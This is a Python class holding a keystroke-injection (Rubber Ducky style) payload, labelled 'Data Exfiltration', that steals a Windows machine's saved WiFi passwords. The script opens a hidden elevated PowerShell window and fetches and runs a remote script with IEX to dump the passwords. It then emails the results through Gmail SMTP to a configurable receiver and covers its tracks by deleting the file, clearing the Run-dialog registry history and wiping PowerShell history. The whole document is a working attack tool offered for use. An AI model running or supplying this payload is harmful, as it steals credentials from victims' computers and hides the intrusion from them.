class info:
    author="n0nuser"
    description = "Retrieves WiFi passwords ands sends them via Gmail"
    function = "Data Exfiltration"
    parameters = [ "SENDER", "PASSWORD", "RECEIVER" ]
    content="""\
DELAY 3000
GUI r
DELAY 400
STRING powershell Start-Process powershell -verb runAs
ENTER
DELAY 750
LEFT
DELAY 750
ENTER
DELAY 750
STRING [console]::WindowWidth=100; [console]::WindowHeight=1; [console]::BufferWidth=[console]::WindowWidth=1
ENTER
DELAY 750

STRING $date = Get-Date -UFormat %d-%m-%y
ENTER
DELAY 500
STRING $filename = $env:UserName + "_" + $date + ".txt"
ENTER
DELAY 500

STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/debianfreak47/Powershell_Scripts/master/pwner.ps1'); pwner >> $filename
ENTER
DELAY 1000

STRING $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('" + SENDER + "', '" + PASSWORD + "'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = '" + SENDER + "'; $ReportEmail.To.Add('" + RECEIVER + "'); $ReportEmail.Subject = 'WiFi Report'; $ReportEmail.Body = Get-Date; $ReportEmail.Attachments.Add('$filename'); $SMTPInfo.Send($ReportEmail)"
ENTER
DELAY 1000

REM STRING clear
REM ENTER
REM DELAY 500

STRING del $filename
ENTER
DELAY 500

STRING Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue
ENTER
DELAY 1000
STRING Clear-History; rm (Get-PSReadlineOption).HistorySavePath
ENTER
DELAY 750

STRING exit
ENTER\
"""